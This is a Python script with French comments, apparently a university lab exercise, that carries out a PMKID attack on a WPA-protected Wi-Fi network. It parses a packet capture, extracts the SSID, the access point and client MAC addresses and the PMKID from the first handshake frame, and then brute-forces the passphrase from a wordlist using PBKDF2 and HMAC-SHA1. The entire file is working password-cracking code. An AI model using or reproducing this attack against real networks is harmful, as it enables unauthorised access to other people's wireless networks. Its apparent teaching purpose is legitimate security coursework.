#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Script permettant d'exécuter une attaque PMKID depuis une capture.
"""


__author__      = "Edin Mujkanovic et Daniel Oliveira Paiva"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "edin.mujkanovic@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from scapy.layers.eap import *
from scapy.layers.dot11 import *
from binascii import a2b_hex, b2a_hex, hexlify
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib


def findSSID(bssid, filename):
    '''
    Méthode permettant de trouver le nom SSID par rapport à BSSID. La méthode cherche dans les beacons contenu dans un fichiers
    Retourne le SSID.
    '''

    #Ouverture du fichier
    wpa=rdpcap(filename) 
    print("Trying to find the SSID name for the BSSID " + bssid)

    #On parcourt les paquets
    for i in range(0,len(wpa)):
        try:
            p = wpa[i]
            dot11 = p[Dot11]
            # On vérifie si c'est un beacon et qu'il correspond au BSSID que l'on cherche
            if(p.type == 0 and p.subtype==8 and p.addr2 == bssid):
                print("SSID found : " + p.info.decode("utf-8"))
                return p.info
        except:
            continue

# Initialisation des paramètres
filename = "PMKID_handshake.pcap"
wpa=rdpcap(filename) 
ssid = None
APmac = None
Clientmac = None
pmkid = None


print("Looking for a 4-way handshake in the capture file \"" + filename + "\"")
# On parcourt toutes les trames
for i in range(0,len(wpa)):
    try:
        p = wpa[i]
        # On vérifie si la trame a le layer "EAPOL"
        ea = p[EAPOL]
        # On récupère le nonce et le mic du paquet
        nonce = hexlify(p.load)[26:90]
        mic = hexlify(p.load)[154:186]
        # Si le nonce est défini et le mic pas, c'est que c'est la première trame du 4-way handshake
        if((mic == b'00000000000000000000000000000000') and (nonce != b'0000000000000000000000000000000000000000000000000000000000000000')):
            print("4-way handshake found !")
            ssid        = findSSID(p.addr2, filename) # On récupère le SSID 
            APmac       = a2b_hex(str.replace(p.addr2, ":", "")) # Récupération de l'adresse MAC de l'AP. On enlève les ":".
            Clientmac   = a2b_hex(str.replace(p.addr1, ":", "")) # Récupération de l'adresse MAC du client. On enlève les ":".
            pmkid = hexlify(p.load)[-32:] # Récupération du PMKID
            break # On arrête la recherche
    except Exception as e:
        #print(e)
        continue

print ("\nValues used to execute PKMID attack")
print ("============================")
print ("SSID: ",ssid.decode("utf-8"))
print ("AP Mac: ",b2a_hex(APmac).decode("utf-8"))
print ("CLient Mac: ",b2a_hex(Clientmac).decode("utf-8"),"\n")

# Début de l'attaque PMKID
print("Starting the PMKID attack")
with open('dictionnary') as dictionnary: # Ouverture du dictionnaire personnalisé
    for currentPass in dictionnary: # On parcourt tous les mots du dictionnaire
        currentPass = currentPass[:-1] # On enleve le \n
        print("Testing " + currentPass)
        currentPass = str.encode(currentPass) # On transforme la string en bytes
        pmkTmp = pbkdf2(hashlib.sha1, currentPass, ssid, 4096, 32) # Calcul du PMK
        pmkidTmp = hmac.new(pmkTmp,str.encode("PMK Name")+APmac+Clientmac,hashlib.sha1).hexdigest()[:32] # Calcul du PMKID pour le pass courant
        if(pmkid == str.encode(pmkidTmp)): # On vérifie si le PMKID calculé est le même que celui récupéré dans les trames, si oui on arrête si non on test une autre passphrase.
            print("!!! pass found " + currentPass.decode("utf-8") + " !!!")
            exit(1)





